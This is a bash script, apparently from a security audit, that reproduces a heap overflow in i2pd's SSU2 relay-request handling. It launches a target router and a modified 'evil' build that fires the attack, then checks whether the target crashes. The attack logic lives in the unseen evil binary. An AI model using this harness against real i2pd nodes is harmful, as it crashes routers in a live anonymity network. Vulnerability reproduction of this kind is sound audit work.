#!/bin/bash
# B5 SSU2 HandleRelayRequest 堆溢出 —— 一体化复现脚本
# 用法: bash run_b5_lab.sh [flavor]  flavor=asan|pristine (目标构建档)
source /home/z/my-project/audit/env.sh
FLAVOR=${1:-asan}
TARGET_BIN=$BUILDS/$FLAVOR/i2pd
EVIL_BIN=$BUILDS/evil/i2pd
IP=21.0.19.150
LAB=$BUILDS/lab-b5-$FLAVOR

rm -rf $LAB; mkdir -p $LAB/target $LAB/evil
# 清理上一轮残留（僵尸进程/端口占用）
pkill -f "audit/builds/.*i2pd" 2>/dev/null; sleep 2
pkill -9 -f "audit/builds/.*i2pd" 2>/dev/null; sleep 1

cat > $LAB/target.conf << 'EOF'
loglevel = info
host = 21.0.19.150
[reseed]
urls =
[ssu2]
port = 17777
[http]
address = 127.0.0.1
port = 7070
EOF

cat > $LAB/evil.conf << 'EOF'
loglevel = info
host = 21.0.19.150
[reseed]
urls =
[ssu2]
port = 27777
[ntcp2]
enabled = false
[http]
address = 127.0.0.1
port = 17070
EOF

echo "[*] 启动目标 ($FLAVOR 档)"
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:handle_segv=1 \
  UBSAN_OPTIONS=print_stacktrace=1 \
  $TARGET_BIN --datadir=$LAB/target --conf=$LAB/target.conf > $LAB/target.log 2>&1 &
TPID=$!
echo "TARGET_PID=$TPID" > $LAB/pids

ready=0
for i in $(seq 1 40); do
  if rg -q "Start listening" $LAB/target.log 2>/dev/null; then ready=1; break; fi
  kill -0 $TPID 2>/dev/null || { echo "[!] 目标启动即崩溃"; tail -5 $LAB/target.log; break; }
  sleep 1
done
echo "[*] 目标就绪=$ready (${i}s), router.info: $(ls -la $LAB/target/router.info 2>/dev/null | awk '{print $5}')"

echo "[*] 启动攻击方 (EVIL_ATTACK=1 EVIL_PAD=1)"
EVIL_ATTACK=1 EVIL_PAD=1 EVIL_TARGET_RI=$LAB/target/router.info \
  $EVIL_BIN --datadir=$LAB/evil --conf=$LAB/evil.conf > $LAB/evil.log 2>&1 &
EPID=$!
echo "EVIL_PID=$EPID" >> $LAB/pids

crash=0
for i in $(seq 1 120); do
  if ! kill -0 $TPID 2>/dev/null; then crash=1; echo "[!!] 目标进程死亡 t=${i}s"; break; fi
  sleep 1
done
if [ $crash -eq 0 ]; then echo "[-] 120s 内未观察到崩溃"; fi

kill $EPID 2>/dev/null; sleep 1; kill -9 $EPID 2>/dev/null
echo "===== 攻击方关键日志 ====="
rg "EVIL|RelayTag|RelayRequest|established|firing|Session" $LAB/evil.log | head -18
echo "===== 目标日志尾部 ====="
tail -70 $LAB/target.log
echo "LAB-DONE flavor=$FLAVOR crash=$crash"
